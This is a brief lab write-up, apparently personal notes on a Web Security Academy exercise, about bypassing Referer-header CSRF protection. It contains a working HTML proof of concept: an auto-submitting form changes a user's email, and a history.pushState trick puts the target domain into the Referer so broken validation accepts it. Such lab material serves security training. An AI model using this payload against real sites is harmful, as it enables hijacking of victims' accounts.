# CSRF Referrer-based protection bypass (broken validation)

![image.png](CSRF%20Referrer-based%20protection%20bypass%20(broken%20vali%201e0021737a8980478cb5fbb49722a33d/image.png)

Note: Referrer-Policy must be set to unsafe-url in order for this payload to work:

![image.png](CSRF%20Referrer-based%20protection%20bypass%20(broken%20vali%201e0021737a8980478cb5fbb49722a33d/image%201.png)

```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ac700d803f43dd5801cc1640046007c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hackezr&#64;hack&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0ac700d803f43dd5801cc1640046007c.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```